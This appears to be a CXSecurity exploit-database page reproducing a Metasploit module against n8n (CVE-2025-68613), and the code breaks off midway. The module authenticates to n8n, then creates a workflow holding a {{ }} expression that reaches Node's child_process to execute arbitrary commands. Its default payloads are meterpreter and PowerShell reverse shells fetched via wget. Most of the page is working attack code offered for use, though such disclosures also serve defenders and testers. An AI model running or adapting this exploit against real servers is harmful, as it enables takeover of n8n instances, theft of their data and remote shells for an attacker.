---
title: n8n Workflow Expression Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2026010008
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-01-14
fetch_date: 2026-01-15T03:29:53.751150
---

# n8n Workflow Expression Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **n8n Workflow Expression Remote Code Execution** **2026.01.14**  Credit:  **[Lukas Johannes Möller](https://cxsecurity.com/author/Lukas%2BJohannes%2BM%C3%B6ller/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-68613](https://cxsecurity.com/cveshow/CVE-2025-68613/ "Click to see CVE-2025-68613")**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'n8n Workflow Expression Remote Code Execution',
'Description' => %q{
This module exploits a critical remote code execution vulnerability (CVE-2025-68613)
in the n8n workflow automation platform. The vulnerability exists in the workflow
expression evaluation system where user-supplied expressions enclosed in {{ }}
are evaluated in an execution context that is not sufficiently isolated from the
underlying Node.js runtime.
An authenticated attacker can create a workflow containing malicious expressions
that access the Node.js process object via this.process.mainModule.require (or via
the constructor) to load child\_process and execute arbitrary system commands.
This module uses a Schedule Trigger node to automatically fire and evaluate the
malicious payload. This requires valid credentials to create workflows.
Successful exploitation may lead to full compromise of the n8n instance,
including unauthorized access to sensitive data, modification of workflows,
and execution of system-level operations.
Affected versions: >= 0.211.0 and < 1.120.4, < 1.121.1, < 1.122.0
},
'Author' => [
'Lukas Johannes Möller'
],
'License' => MSF\_LICENSE,
'References' => [
['CVE', '2025-68613'],
['URL', 'https://github.com/n8n-io/n8n/security/advisories'],
['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2025-68613']
],
'Platform' => ['unix', 'linux', 'win'],
'Arch' => [ARCH\_CMD],
'Targets' => [
[
'Unix/Linux Command',
{
'Platform' => %w[unix linux],
'Arch' => ARCH\_CMD,
'Type' => :unix\_cmd,
'DefaultOptions' => {
# cmd/unix payloads use commands that might not be present in docker instance
'PAYLOAD' => 'cmd/linux/http/x64/meterpreter\_reverse\_tcp',
'FETCH\_COMMAND' => 'wget'
}
}
],
[
'Windows Command',
{
'Platform' => 'win',
'Arch' => ARCH\_CMD,
'Type' => :win\_cmd,
'DefaultOptions' => {
'PAYLOAD' => 'cmd/windows/powershell\_reverse\_tcp'
}
}
]
],
'Payload' => {
'BadChars' => %(')
},
'Privileged' => false,
'DisclosureDate' => '2025-06-10',
'DefaultTarget' => 0,
'DefaultOptions' => {
'RPORT' => 5678,
'SSL' => false
},
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [IOC\_IN\_LOGS, ARTIFACTS\_ON\_DISK]
}
)
)
register\_options(
[
OptString.new('TARGETURI', [true, 'Base path to n8n', '/']),
OptString.new('USERNAME', [true, 'n8n username or email for authentication']),
OptString.new('PASSWORD', [true, 'n8n password for authentication'])
]
)
end
def check
return CheckCode::Unknown('Could not authenticate to n8n') unless authenticate
res = send\_request\_cgi(
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, 'rest', 'settings')
)
return CheckCode::Unknown('Could not connect to n8n') if res.blank?
return CheckCode::Detected('Connected to n8n, received unexpected response') unless res.code == 200
json = res.get\_json\_document
version = Rex::Version.new(json.dig('data', 'versionCli'))
return CheckCode::Detected('n8n detected but could not determine version') unless version
print\_status("Detected n8n version: #{version}")
return CheckCode::Appears("Version #{version} is vulnerable") if version.between?(Rex::Version.new('0.211.0'), Rex::Version.new('1.120.4')) || version == Rex::Version.new('1.121.0')
CheckCode::Safe("Version #{version} is not vulnerable")
end
def authenticate
print\_status('Attempting to authenticate...')
res = send\_request\_cgi(
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, 'rest', 'login'),
'ctype' => 'application/json',
'keep\_cookies' => true,
'data' => {
'emailOrLdapLoginId' => datastore['USERNAME'],
'email' => datastore['USERNAME'],
'password' => datastore['PASSWORD']
}.to\_json
)
return true if res&.code == 200
json\_data = res.get\_json\_document
print\_error("Login failed: #{json\_data['message']}")
false
end
def create\_malicious\_workflow(cmd)
expression\_payload = %<{{ (function(){ return this.process.mainModule.require('child\_process').execSync('#{cmd}').toString() })() }}>
@workflow\_name = "workflow\_#{Rex::Text.rand\_text\_alphanumeric(8)}"
workflow\_data = {
'name' => @workflow\_name,
'active' => false,
'settings' => {
'saveDataErrorExecution' => 'all',
'saveDataSuccessExecution' => 'all',
'saveManualExecutions' => true,
'executionOrder' => 'v1'
},
'nodes' => [
{
parameters: {},
type: 'n8n-nodes-base.manualTrigger',
typeVersion: 1,
position: [
0,
0
],
'id' => Rex::Text.rand\_text\_alphanumeric(36),
name: "When clicking 'Execute workflow'"
},
{
parameters: {
values: {
string: [
{
value: "=#{expression\_payload}"
}
]
},
options: {}
},
id: '40031677-e085-4434-9168-fb0b21ead60d',
name: 'Set',
type: 'n8n-nodes-base.set',
typeVersion: 1,
position: [
220,
0
]
}
],
'connections' => {
"When clicking 'Execute workflow'" => {
'main' => [
[
{
'node' => 'Set',
'type' => 'main',
'index' => 0
}
]
]
}
}
}
print\_status('Creating malicious workflow...')
res = send\_request\_cgi(
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, 'rest', 'workflows'),
'ctype' => 'application/json',
'keep\_cookies' => true,
'data' => workflow\_data.to\_json
)
fail\_with(Failure::UnexpectedReply, "Failed to create workflow: #{res&.code}") unless res&.code == 200 || res&.code == 201
json = res.get\_json\_document
@workflow\_id = json.dig('data', 'id') || json['id']
nodes = json.dig('data', 'nodes')
version\_id = json.dig('data', 'versionId')
id = json.dig('data', 'id')
fail\_with(Failure::UnexpectedReply, 'Failed to get workflow ID from response') ...